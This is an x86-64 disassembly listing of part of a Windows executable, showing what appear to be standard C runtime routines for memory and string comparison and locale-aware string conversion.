   1400088b9:	cc                   	int3
   1400088ba:	cc                   	int3
   1400088bb:	cc                   	int3
   1400088bc:	cc                   	int3
   1400088bd:	cc                   	int3
   1400088be:	cc                   	int3
   1400088bf:	cc                   	int3
   1400088c0:	cc                   	int3
   1400088c1:	cc                   	int3
   1400088c2:	cc                   	int3
   1400088c3:	cc                   	int3
   1400088c4:	cc                   	int3
   1400088c5:	cc                   	int3
   1400088c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400088cd:	00 00 00 
   1400088d0:	48 2b d1             	sub    %rcx,%rdx
   1400088d3:	49 83 f8 08          	cmp    $0x8,%r8
   1400088d7:	72 22                	jb     0x1400088fb
   1400088d9:	f6 c1 07             	test   $0x7,%cl
   1400088dc:	74 14                	je     0x1400088f2
   1400088de:	66 90                	xchg   %ax,%ax
   1400088e0:	8a 01                	mov    (%rcx),%al
   1400088e2:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   1400088e5:	75 2c                	jne    0x140008913
   1400088e7:	48 ff c1             	inc    %rcx
   1400088ea:	49 ff c8             	dec    %r8
   1400088ed:	f6 c1 07             	test   $0x7,%cl
   1400088f0:	75 ee                	jne    0x1400088e0
   1400088f2:	4d 8b c8             	mov    %r8,%r9
   1400088f5:	49 c1 e9 03          	shr    $0x3,%r9
   1400088f9:	75 1f                	jne    0x14000891a
   1400088fb:	4d 85 c0             	test   %r8,%r8
   1400088fe:	74 0f                	je     0x14000890f
   140008900:	8a 01                	mov    (%rcx),%al
   140008902:	3a 04 0a             	cmp    (%rdx,%rcx,1),%al
   140008905:	75 0c                	jne    0x140008913
   140008907:	48 ff c1             	inc    %rcx
   14000890a:	49 ff c8             	dec    %r8
   14000890d:	75 f1                	jne    0x140008900
   14000890f:	48 33 c0             	xor    %rax,%rax
   140008912:	c3                   	ret
   140008913:	1b c0                	sbb    %eax,%eax
   140008915:	83 d8 ff             	sbb    $0xffffffff,%eax
   140008918:	c3                   	ret
   140008919:	90                   	nop
   14000891a:	49 c1 e9 02          	shr    $0x2,%r9
   14000891e:	74 37                	je     0x140008957
   140008920:	48 8b 01             	mov    (%rcx),%rax
   140008923:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   140008927:	75 5b                	jne    0x140008984
   140008929:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000892d:	48 3b 44 0a 08       	cmp    0x8(%rdx,%rcx,1),%rax
   140008932:	75 4c                	jne    0x140008980
   140008934:	48 8b 41 10          	mov    0x10(%rcx),%rax
   140008938:	48 3b 44 0a 10       	cmp    0x10(%rdx,%rcx,1),%rax
   14000893d:	75 3d                	jne    0x14000897c
   14000893f:	48 8b 41 18          	mov    0x18(%rcx),%rax
   140008943:	48 3b 44 0a 18       	cmp    0x18(%rdx,%rcx,1),%rax
   140008948:	75 2e                	jne    0x140008978
   14000894a:	48 83 c1 20          	add    $0x20,%rcx
   14000894e:	49 ff c9             	dec    %r9
   140008951:	75 cd                	jne    0x140008920
   140008953:	49 83 e0 1f          	and    $0x1f,%r8
   140008957:	4d 8b c8             	mov    %r8,%r9
   14000895a:	49 c1 e9 03          	shr    $0x3,%r9
   14000895e:	74 9b                	je     0x1400088fb
   140008960:	48 8b 01             	mov    (%rcx),%rax
   140008963:	48 3b 04 0a          	cmp    (%rdx,%rcx,1),%rax
   140008967:	75 1b                	jne    0x140008984
   140008969:	48 83 c1 08          	add    $0x8,%rcx
   14000896d:	49 ff c9             	dec    %r9
   140008970:	75 ee                	jne    0x140008960
   140008972:	49 83 e0 07          	and    $0x7,%r8
   140008976:	eb 83                	jmp    0x1400088fb
   140008978:	48 83 c1 08          	add    $0x8,%rcx
   14000897c:	48 83 c1 08          	add    $0x8,%rcx
   140008980:	48 83 c1 08          	add    $0x8,%rcx
   140008984:	48 8b 0c 11          	mov    (%rcx,%rdx,1),%rcx
   140008988:	48 0f c8             	bswap  %rax
   14000898b:	48 0f c9             	bswap  %rcx
   14000898e:	48 3b c1             	cmp    %rcx,%rax
   140008991:	1b c0                	sbb    %eax,%eax
   140008993:	83 d8 ff             	sbb    $0xffffffff,%eax
   140008996:	c3                   	ret
   140008997:	cc                   	int3
   140008998:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   14000899d:	55                   	push   %rbp
   14000899e:	41 54                	push   %r12
   1400089a0:	41 55                	push   %r13
   1400089a2:	41 56                	push   %r14
   1400089a4:	41 57                	push   %r15
   1400089a6:	48 83 ec 40          	sub    $0x40,%rsp
   1400089aa:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400089af:	48 89 5d 40          	mov    %rbx,0x40(%rbp)
   1400089b3:	48 89 75 48          	mov    %rsi,0x48(%rbp)
   1400089b7:	48 89 7d 50          	mov    %rdi,0x50(%rbp)
   1400089bb:	48 8b 05 86 a6 00 00 	mov    0xa686(%rip),%rax        # 0x140013048
   1400089c2:	48 33 c5             	xor    %rbp,%rax
   1400089c5:	48 89 45 08          	mov    %rax,0x8(%rbp)
   1400089c9:	44 8b 0d a4 c9 00 00 	mov    0xc9a4(%rip),%r9d        # 0x140015374
   1400089d0:	bf 01 00 00 00       	mov    $0x1,%edi
   1400089d5:	33 db                	xor    %ebx,%ebx
   1400089d7:	4d 8b f0             	mov    %r8,%r14
   1400089da:	44 8b fa             	mov    %edx,%r15d
   1400089dd:	4c 8b e9             	mov    %rcx,%r13
   1400089e0:	8d 77 01             	lea    0x1(%rdi),%esi
   1400089e3:	44 3b cb             	cmp    %ebx,%r9d
   1400089e6:	75 3d                	jne    0x140008a25
   1400089e8:	4c 8d 4d 00          	lea    0x0(%rbp),%r9
   1400089ec:	48 8d 15 f1 74 00 00 	lea    0x74f1(%rip),%rdx        # 0x14000fee4
   1400089f3:	44 8b c7             	mov    %edi,%r8d
   1400089f6:	8b cf                	mov    %edi,%ecx
   1400089f8:	ff 15 9a 56 00 00    	call   *0x569a(%rip)        # 0x14000e098
   1400089fe:	3b c3                	cmp    %ebx,%eax
   140008a00:	74 08                	je     0x140008a0a
   140008a02:	89 3d 6c c9 00 00    	mov    %edi,0xc96c(%rip)        # 0x140015374
   140008a08:	eb 36                	jmp    0x140008a40
   140008a0a:	ff 15 40 56 00 00    	call   *0x5640(%rip)        # 0x14000e050
   140008a10:	44 8b 0d 5d c9 00 00 	mov    0xc95d(%rip),%r9d        # 0x140015374
   140008a17:	83 f8 78             	cmp    $0x78,%eax
   140008a1a:	44 0f 44 ce          	cmove  %esi,%r9d
   140008a1e:	44 89 0d 4f c9 00 00 	mov    %r9d,0xc94f(%rip)        # 0x140015374
   140008a25:	44 3b ce             	cmp    %esi,%r9d
   140008a28:	0f 84 26 01 00 00    	je     0x140008b54
   140008a2e:	44 3b cb             	cmp    %ebx,%r9d
   140008a31:	0f 84 1d 01 00 00    	je     0x140008b54
   140008a37:	44 3b cf             	cmp    %edi,%r9d
   140008a3a:	0f 85 43 01 00 00    	jne    0x140008b83
   140008a40:	8b 75 68             	mov    0x68(%rbp),%esi
   140008a43:	3b f3                	cmp    %ebx,%esi
   140008a45:	75 07                	jne    0x140008a4e
   140008a47:	49 8b 45 00          	mov    0x0(%r13),%rax
   140008a4b:	8b 70 04             	mov    0x4(%rax),%esi
   140008a4e:	f7 5d 78             	negl   0x78(%rbp)
   140008a51:	44 8b 4d 58          	mov    0x58(%rbp),%r9d
   140008a55:	4d 8b c6             	mov    %r14,%r8
   140008a58:	1b d2                	sbb    %edx,%edx
   140008a5a:	8b ce                	mov    %esi,%ecx
   140008a5c:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140008a60:	83 e2 08             	and    $0x8,%edx
   140008a63:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008a68:	03 d7                	add    %edi,%edx
   140008a6a:	ff 15 30 56 00 00    	call   *0x5630(%rip)        # 0x14000e0a0
   140008a70:	4c 63 e0             	movslq %eax,%r12
   140008a73:	44 3b e3             	cmp    %ebx,%r12d
   140008a76:	0f 84 07 01 00 00    	je     0x140008b83
   140008a7c:	41 bd dd dd 00 00    	mov    $0xdddd,%r13d
   140008a82:	7e 68                	jle    0x140008aec
   140008a84:	48 b8 f0 ff ff ff ff 	movabs $0x7ffffffffffffff0,%rax
   140008a8b:	ff ff 7f 
   140008a8e:	4c 3b e0             	cmp    %rax,%r12
   140008a91:	77 59                	ja     0x140008aec
   140008a93:	4b 8d 4c 24 10       	lea    0x10(%r12,%r12,1),%rcx
   140008a98:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   140008a9f:	77 35                	ja     0x140008ad6
   140008aa1:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140008aa5:	48 3b c1             	cmp    %rcx,%rax
   140008aa8:	77 0a                	ja     0x140008ab4
   140008aaa:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140008ab1:	ff ff 0f 
   140008ab4:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140008ab8:	e8 e3 37 00 00       	call   0x14000c2a0
   140008abd:	48 2b e0             	sub    %rax,%rsp
   140008ac0:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140008ac5:	48 3b fb             	cmp    %rbx,%rdi
   140008ac8:	0f 84 b5 00 00 00    	je     0x140008b83
   140008ace:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   140008ad4:	eb 10                	jmp    0x140008ae6
   140008ad6:	e8 c5 9d ff ff       	call   0x1400028a0
   140008adb:	48 8b f8             	mov    %rax,%rdi
   140008ade:	48 3b c3             	cmp    %rbx,%rax
   140008ae1:	74 0c                	je     0x140008aef
   140008ae3:	44 89 28             	mov    %r13d,(%rax)
   140008ae6:	48 83 c7 10          	add    $0x10,%rdi
   140008aea:	eb 03                	jmp    0x140008aef
   140008aec:	48 8b fb             	mov    %rbx,%rdi
   140008aef:	48 3b fb             	cmp    %rbx,%rdi
   140008af2:	0f 84 8b 00 00 00    	je     0x140008b83
   140008af8:	4d 8b c4             	mov    %r12,%r8
   140008afb:	33 d2                	xor    %edx,%edx
   140008afd:	48 8b cf             	mov    %rdi,%rcx
   140008b00:	4d 03 c0             	add    %r8,%r8
   140008b03:	e8 68 9f ff ff       	call   0x140002a70
   140008b08:	44 8b 4d 58          	mov    0x58(%rbp),%r9d
   140008b0c:	4d 8b c6             	mov    %r14,%r8
   140008b0f:	ba 01 00 00 00       	mov    $0x1,%edx
   140008b14:	8b ce                	mov    %esi,%ecx
   140008b16:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   140008b1b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140008b20:	ff 15 7a 55 00 00    	call   *0x557a(%rip)        # 0x14000e0a0
   140008b26:	3b c3                	cmp    %ebx,%eax
   140008b28:	74 15                	je     0x140008b3f
   140008b2a:	4c 8b 4d 60          	mov    0x60(%rbp),%r9
   140008b2e:	44 8b c0             	mov    %eax,%r8d
   140008b31:	48 8b d7             	mov    %rdi,%rdx
   140008b34:	41 8b cf             	mov    %r15d,%ecx
   140008b37:	ff 15 5b 55 00 00    	call   *0x555b(%rip)        # 0x14000e098
   140008b3d:	8b d8                	mov    %eax,%ebx
   140008b3f:	48 8d 4f f0          	lea    -0x10(%rdi),%rcx
   140008b43:	44 39 29             	cmp    %r13d,(%rcx)
   140008b46:	75 05                	jne    0x140008b4d
   140008b48:	e8 cb 9e ff ff       	call   0x140002a18
   140008b4d:	8b c3                	mov    %ebx,%eax
   140008b4f:	e9 88 00 00 00       	jmp    0x140008bdc
   140008b54:	44 8b 65 70          	mov    0x70(%rbp),%r12d
   140008b58:	48 8b fb             	mov    %rbx,%rdi
   140008b5b:	44 3b e3             	cmp    %ebx,%r12d
   140008b5e:	75 08                	jne    0x140008b68
   140008b60:	49 8b 45 00          	mov    0x0(%r13),%rax
   140008b64:	44 8b 60 14          	mov    0x14(%rax),%r12d
   140008b68:	8b 75 68             	mov    0x68(%rbp),%esi
   140008b6b:	3b f3                	cmp    %ebx,%esi
   140008b6d:	75 07                	jne    0x140008b76
   140008b6f:	49 8b 45 00          	mov    0x0(%r13),%rax
   140008b73:	8b 70 04             	mov    0x4(%rax),%esi
   140008b76:	41 8b cc             	mov    %r12d,%ecx
   140008b79:	e8 c6 0f 00 00       	call   0x140009b44
   140008b7e:	83 f8 ff             	cmp    $0xffffffff,%eax
   140008b81:	75 04                	jne    0x140008b87
   140008b83:	33 c0                	xor    %eax,%eax
   140008b85:	eb 55                	jmp    0x140008bdc
   140008b87:	3b c6                	cmp    %esi,%eax
   140008b89:	74 24                	je     0x140008baf
   140008b8b:	4c 8d 4d 58          	lea    0x58(%rbp),%r9
   140008b8f:	4d 8b c6             	mov    %r14,%r8
   140008b92:	8b d0                	mov    %eax,%edx
   140008b94:	8b ce                	mov    %esi,%ecx
   140008b96:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140008b9a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140008b9f:	e8 f4 0f 00 00       	call   0x140009b98
   140008ba4:	48 8b f8             	mov    %rax,%rdi
   140008ba7:	48 3b c3             	cmp    %rbx,%rax
   140008baa:	74 d7                	je     0x140008b83
   140008bac:	4c 8b f0             	mov    %rax,%r14
   140008baf:	48 8b 45 60          	mov    0x60(%rbp),%rax
   140008bb3:	44 8b 4d 58          	mov    0x58(%rbp),%r9d
   140008bb7:	4d 8b c6             	mov    %r14,%r8
   140008bba:	41 8b d7             	mov    %r15d,%edx
   140008bbd:	41 8b cc             	mov    %r12d,%ecx
   140008bc0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008bc5:	ff 15 dd 54 00 00    	call   *0x54dd(%rip)        # 0x14000e0a8
   140008bcb:	8b f0                	mov    %eax,%esi
   140008bcd:	48 3b fb             	cmp    %rbx,%rdi
   140008bd0:	74 08                	je     0x140008bda
   140008bd2:	48 8b cf             	mov    %rdi,%rcx
   140008bd5:	e8 3e 9e ff ff       	call   0x140002a18
   140008bda:	8b c6                	mov    %esi,%eax
   140008bdc:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140008be0:	48 33 cd             	xor    %rbp,%rcx
   140008be3:	e8 58 8e ff ff       	call   0x140001a40
   140008be8:	48 8b 5d 40          	mov    0x40(%rbp),%rbx
   140008bec:	48 8b 75 48          	mov    0x48(%rbp),%rsi
   140008bf0:	48 8b 7d 50          	mov    0x50(%rbp),%rdi
   140008bf4:	48 8d 65 10          	lea    0x10(%rbp),%rsp
   140008bf8:	41 5f                	pop    %r15
   140008bfa:	41 5e                	pop    %r14
   140008bfc:	41 5d                	pop    %r13
   140008bfe:	41 5c                	pop    %r12
   140008c00:	5d                   	pop    %rbp
   140008c01:	c3                   	ret
   140008c02:	cc                   	int3
   140008c03:	cc                   	int3
   140008c04:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008c09:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008c0e:	57                   	push   %rdi
   140008c0f:	48 83 ec 60          	sub    $0x60,%rsp
   140008c13:	8b f2                	mov    %edx,%esi
   140008c15:	48 8b d1             	mov    %rcx,%rdx
   140008c18:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008c1d:	41 8b d9             	mov    %r9d,%ebx
   140008c20:	49 8b f8             	mov    %r8,%rdi
   140008c23:	e8 58 ba ff ff       	call   0x140004680
   140008c28:	8b 84 24 a0 00 00 00 	mov    0xa0(%rsp),%eax
   140008c2f:	44 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%r11d
   140008c36:	00 
   140008c37:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140008c3c:	44 89 5c 24 38       	mov    %r11d,0x38(%rsp)
   140008c41:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140008c45:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   140008c4c:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140008c50:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   140008c57:	00 
   140008c58:	44 8b cb             	mov    %ebx,%r9d
   140008c5b:	4c 8b c7             	mov    %rdi,%r8
   140008c5e:	8b d6                	mov    %esi,%edx
   140008c60:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140008c65:	e8 2e fd ff ff       	call   0x140008998
   140008c6a:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   140008c6f:	74 0c                	je     0x140008c7d
   140008c71:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140008c76:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140008c7d:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140008c82:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140008c87:	48 83 c4 60          	add    $0x60,%rsp
   140008c8b:	5f                   	pop    %rdi
   140008c8c:	c3                   	ret
   140008c8d:	cc                   	int3
   140008c8e:	cc                   	int3
   140008c8f:	cc                   	int3
   140008c90:	cc                   	int3
   140008c91:	cc                   	int3
   140008c92:	cc                   	int3
   140008c93:	cc                   	int3
   140008c94:	cc                   	int3
   140008c95:	cc                   	int3
   140008c96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140008c9d:	00 00 00 
   140008ca0:	4d 85 c0             	test   %r8,%r8
   140008ca3:	74 75                	je     0x140008d1a
   140008ca5:	48 2b d1             	sub    %rcx,%rdx
   140008ca8:	4c 8b ca             	mov    %rdx,%r9
   140008cab:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   140008cb2:	01 01 81 
   140008cb5:	f6 c1 07             	test   $0x7,%cl
   140008cb8:	74 1f                	je     0x140008cd9
   140008cba:	8a 01                	mov    (%rcx),%al
   140008cbc:	42 8a 14 09          	mov    (%rcx,%r9,1),%dl
   140008cc0:	48 ff c1             	inc    %rcx
   140008cc3:	3a c2                	cmp    %dl,%al
   140008cc5:	75 57                	jne    0x140008d1e
   140008cc7:	49 ff c8             	dec    %r8
   140008cca:	74 4e                	je     0x140008d1a
   140008ccc:	84 c0                	test   %al,%al
   140008cce:	74 4a                	je     0x140008d1a
   140008cd0:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   140008cd7:	75 e1                	jne    0x140008cba
   140008cd9:	4a 8d 14 09          	lea    (%rcx,%r9,1),%rdx
   140008cdd:	66 81 e2 ff 0f       	and    $0xfff,%dx
   140008ce2:	66 81 fa f8 0f       	cmp    $0xff8,%dx
   140008ce7:	77 d1                	ja     0x140008cba
   140008ce9:	48 8b 01             	mov    (%rcx),%rax
   140008cec:	4a 8b 14 09          	mov    (%rcx,%r9,1),%rdx
   140008cf0:	48 3b c2             	cmp    %rdx,%rax
   140008cf3:	75 c5                	jne    0x140008cba
   140008cf5:	48 83 c1 08          	add    $0x8,%rcx
   140008cf9:	49 83 e8 08          	sub    $0x8,%r8
   140008cfd:	49 ba ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r10
   140008d04:	fe fe 7e 
   140008d07:	76 11                	jbe    0x140008d1a
   140008d09:	48 83 f0 ff          	xor    $0xffffffffffffffff,%rax
   140008d0d:	4c 03 d2             	add    %rdx,%r10
   140008d10:	49 33 c2             	xor    %r10,%rax
   140008d13:	49 85 c3             	test   %rax,%r11
   140008d16:	74 c1                	je     0x140008cd9
   140008d18:	eb 0c                	jmp    0x140008d26
   140008d1a:	48 33 c0             	xor    %rax,%rax
   140008d1d:	c3                   	ret
   140008d1e:	48 1b c0             	sbb    %rax,%rax
   140008d21:	48 83 d8 ff          	sbb    $0xffffffffffffffff,%rax
   140008d25:	c3                   	ret
   140008d26:	84 d2                	test   %dl,%dl
   140008d28:	74 27                	je     0x140008d51
   140008d2a:	84 f6                	test   %dh,%dh
   140008d2c:	74 23                	je     0x140008d51
   140008d2e:	48 c1 ea 10          	shr    $0x10,%rdx
   140008d32:	84 d2                	test   %dl,%dl
   140008d34:	74 1b                	je     0x140008d51
   140008d36:	84 f6                	test   %dh,%dh
   140008d38:	74 17                	je     0x140008d51
   140008d3a:	48 c1 ea 10          	shr    $0x10,%rdx
   140008d3e:	84 d2                	test   %dl,%dl
   140008d40:	74 0f                	je     0x140008d51
   140008d42:	84 f6                	test   %dh,%dh
   140008d44:	74 0b                	je     0x140008d51
   140008d46:	c1 ea 10             	shr    $0x10,%edx
   140008d49:	84 d2                	test   %dl,%dl
   140008d4b:	74 04                	je     0x140008d51
   140008d4d:	84 f6                	test   %dh,%dh
   140008d4f:	75 88                	jne    0x140008cd9
   140008d51:	48 33 c0             	xor    %rax,%rax
   140008d54:	c3                   	ret
   140008d55:	cc                   	int3
   140008d56:	cc                   	int3
   140008d57:	cc                   	int3
   140008d58:	40 55                	rex push %rbp
   140008d5a:	41 54                	push   %r12
   140008d5c:	41 55                	push   %r13
   140008d5e:	41 56                	push   %r14
   140008d60:	41 57                	push   %r15
   140008d62:	48 83 ec 60          	sub    $0x60,%rsp
   140008d66:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140008d6b:	48 89 5d 50          	mov    %rbx,0x50(%rbp)
   140008d6f:	48 89 75 58          	mov    %rsi,0x58(%rbp)
   140008d73:	48 89 7d 60          	mov    %rdi,0x60(%rbp)
   140008d77:	48 8b 05 ca a2 00 00 	mov    0xa2ca(%rip),%rax        # 0x140013048
   140008d7e:	48 33 c5             	xor    %rbp,%rax
   140008d81:	48 89 45 18          	mov    %rax,0x18(%rbp)
   140008d85:	44 8b 15 ec c5 00 00 	mov    0xc5ec(%rip),%r10d        # 0x140015378
   140008d8c:	be 02 00 00 00       	mov    $0x2,%esi
   140008d91:	33 ff                	xor    %edi,%edi
   140008d93:	4d 8b d9             	mov    %r9,%r11
   140008d96:	4c 89 4d 10          	mov    %r9,0x10(%rbp)
   140008d9a:	44 89 45 00          	mov    %r8d,0x0(%rbp)
   140008d9e:	44 8b f2             	mov    %edx,%r14d
   140008da1:	89 55 08             	mov    %edx,0x8(%rbp)
   140008da4:	48 8b d9             	mov    %rcx,%rbx
   140008da7:	44 8d 6e ff          	lea    -0x1(%rsi),%r13d
   140008dab:	44 3b d7             	cmp    %edi,%r10d
   140008dae:	75 4f                	jne    0x140008dff
   140008db0:	4c 8d 05 2d 71 00 00 	lea    0x712d(%rip),%r8        # 0x14000fee4
   140008db7:	45 8b cd             	mov    %r13d,%r9d
   140008dba:	ba 00 01 00 00       	mov    $0x100,%edx
   140008dbf:	33 c9                	xor    %ecx,%ecx
   140008dc1:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140008dc5:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140008dca:	ff 15 b8 52 00 00    	call   *0x52b8(%rip)        # 0x14000e088
   140008dd0:	3b c7                	cmp    %edi,%eax
   140008dd2:	74 0c                	je     0x140008de0
   140008dd4:	45 8b d5             	mov    %r13d,%r10d
   140008dd7:	44 89 2d 9a c5 00 00 	mov    %r13d,0xc59a(%rip)        # 0x140015378
   140008dde:	eb 1b                	jmp    0x140008dfb
   140008de0:	ff 15 6a 52 00 00    	call   *0x526a(%rip)        # 0x14000e050
   140008de6:	44 8b 15 8b c5 00 00 	mov    0xc58b(%rip),%r10d        # 0x140015378
   140008ded:	83 f8 78             	cmp    $0x78,%eax
   140008df0:	44 0f 44 d6          	cmove  %esi,%r10d
   140008df4:	44 89 15 7d c5 00 00 	mov    %r10d,0xc57d(%rip)        # 0x140015378
   140008dfb:	4c 8b 5d 10          	mov    0x10(%rbp),%r11
   140008dff:	44 8b 4d 70          	mov    0x70(%rbp),%r9d
   140008e03:	44 3b cf             	cmp    %edi,%r9d
   140008e06:	7e 35                	jle    0x140008e3d
   140008e08:	41 8b c9             	mov    %r9d,%ecx
   140008e0b:	49 8b c3             	mov    %r11,%rax
   140008e0e:	41 2b cd             	sub    %r13d,%ecx
   140008e11:	40 38 38             	cmp    %dil,(%rax)
   140008e14:	74 0a                	je     0x140008e20
   140008e16:	49 03 c5             	add    %r13,%rax
   140008e19:	3b cf                	cmp    %edi,%ecx
   140008e1b:	75 f1                	jne    0x140008e0e
   140008e1d:	83 c9 ff             	or     $0xffffffff,%ecx
   140008e20:	41 8b c1             	mov    %r9d,%eax
   140008e23:	2b c1                	sub    %ecx,%eax
   140008e25:	41 2b c5             	sub    %r13d,%eax
   140008e28:	41 3b c1             	cmp    %r9d,%eax
   140008e2b:	7d 0a                	jge    0x140008e37
   140008e2d:	44 8d 48 01          	lea    0x1(%rax),%r9d
   140008e31:	44 89 4d 70          	mov    %r9d,0x70(%rbp)
   140008e35:	eb 06                	jmp    0x140008e3d
   140008e37:	44 8b c8             	mov    %eax,%r9d
   140008e3a:	89 45 70             	mov    %eax,0x70(%rbp)
   140008e3d:	44 3b d6             	cmp    %esi,%r10d
   140008e40:	0f 84 5c 02 00 00    	je     0x1400090a2
   140008e46:	44 3b d7             	cmp    %edi,%r10d
   140008e49:	0f 84 53 02 00 00    	je     0x1400090a2
   140008e4f:	45 3b d5             	cmp    %r13d,%r10d
   140008e52:	0f 85 80 02 00 00    	jne    0x1400090d8
   140008e58:	44 8b a5 88 00 00 00 	mov    0x88(%rbp),%r12d
   140008e5f:	8b f7                	mov    %edi,%esi
   140008e61:	44 3b e7             	cmp    %edi,%r12d
   140008e64:	75 07                	jne    0x140008e6d
   140008e66:	48 8b 03             	mov    (%rbx),%rax
   140008e69:	44 8b 60 04          	mov    0x4(%rax),%r12d
   140008e6d:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   140008e73:	4d 8b c3             	mov    %r11,%r8
   140008e76:	41 8b cc             	mov    %r12d,%ecx
   140008e79:	1b d2                	sbb    %edx,%edx
   140008e7b:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140008e7f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140008e84:	83 e2 08             	and    $0x8,%edx
   140008e87:	41 03 d5             	add    %r13d,%edx
   140008e8a:	ff 15 10 52 00 00    	call   *0x5210(%rip)        # 0x14000e0a0
   140008e90:	4c 63 f8             	movslq %eax,%r15
   140008e93:	44 3b ff             	cmp    %edi,%r15d
   140008e96:	0f 84 3c 02 00 00    	je     0x1400090d8
   140008e9c:	48 bb f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rbx
   140008ea3:	ff ff 0f 
   140008ea6:	41 be dd dd 00 00    	mov    $0xdddd,%r14d
   140008eac:	41 bd 00 04 00 00    	mov    $0x400,%r13d
   140008eb2:	7e 5b                	jle    0x140008f0f
   140008eb4:	33 d2                	xor    %edx,%edx
   140008eb6:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140008eba:	49 f7 f7             	div    %r15
   140008ebd:	48 83 f8 02          	cmp    $0x2,%rax
   140008ec1:	72 4c                	jb     0x140008f0f
   140008ec3:	4b 8d 4c 3f 10       	lea    0x10(%r15,%r15,1),%rcx
   140008ec8:	49 3b cd             	cmp    %r13,%rcx
   140008ecb:	77 2e                	ja     0x140008efb
   140008ecd:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140008ed1:	48 3b c1             	cmp    %rcx,%rax
   140008ed4:	77 03                	ja     0x140008ed9
   140008ed6:	48 8b c3             	mov    %rbx,%rax
   140008ed9:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140008edd:	e8 be 33 00 00       	call   0x14000c2a0
   140008ee2:	48 2b e0             	sub    %rax,%rsp
   140008ee5:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   140008eea:	48 85 ff             	test   %rdi,%rdi
   140008eed:	0f 84 e5 01 00 00    	je     0x1400090d8
   140008ef3:	c7 07 cc cc 00 00    	movl   $0xcccc,(%rdi)
   140008ef9:	eb 10                	jmp    0x140008f0b
   140008efb:	e8 a0 99 ff ff       	call   0x1400028a0
   140008f00:	48 8b f8             	mov    %rax,%rdi
   140008f03:	48 85 c0             	test   %rax,%rax
   140008f06:	74 07                	je     0x140008f0f
   140008f08:	44 89 30             	mov    %r14d,(%rax)
   140008f0b:	48 83 c7 10          	add    $0x10,%rdi
   140008f0f:	48 85 ff             	test   %rdi,%rdi
   140008f12:	0f 84 c0 01 00 00    	je     0x1400090d8
   140008f18:	44 8b 4d 70          	mov    0x70(%rbp),%r9d
   140008f1c:	4c 8b 45 10          	mov    0x10(%rbp),%r8
   140008f20:	ba 01 00 00 00       	mov    $0x1,%edx
   140008f25:	41 8b cc             	mov    %r12d,%ecx
   140008f28:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   140008f2d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140008f32:	ff 15 68 51 00 00    	call   *0x5168(%rip)        # 0x14000e0a0
   140008f38:	33 c9                	xor    %ecx,%ecx
   140008f3a:	3b c1                	cmp    %ecx,%eax
   140008f3c:	0f 84 4b 01 00 00    	je     0x14000908d
   140008f42:	8b 55 00             	mov    0x0(%rbp),%edx
   140008f45:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140008f49:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140008f4e:	8b 4d 08             	mov    0x8(%rbp),%ecx
   140008f51:	45 8b cf             	mov    %r15d,%r9d
   140008f54:	4c 8b c7             	mov    %rdi,%r8
   140008f57:	ff 15 2b 51 00 00    	call   *0x512b(%rip)        # 0x14000e088
   140008f5d:	45 33 c0             	xor    %r8d,%r8d
   140008f60:	48 63 f0             	movslq %eax,%rsi
   140008f63:	41 3b f0             	cmp    %r8d,%esi
   140008f66:	0f 84 21 01 00 00    	je     0x14000908d
   140008f6c:	44 8b 55 00          	mov    0x0(%rbp),%r10d
   140008f70:	41 0f ba e2 0a       	bt     $0xa,%r10d
   140008f75:	73 3b                	jae    0x140008fb2
   140008f77:	8b 85 80 00 00 00    	mov    0x80(%rbp),%eax
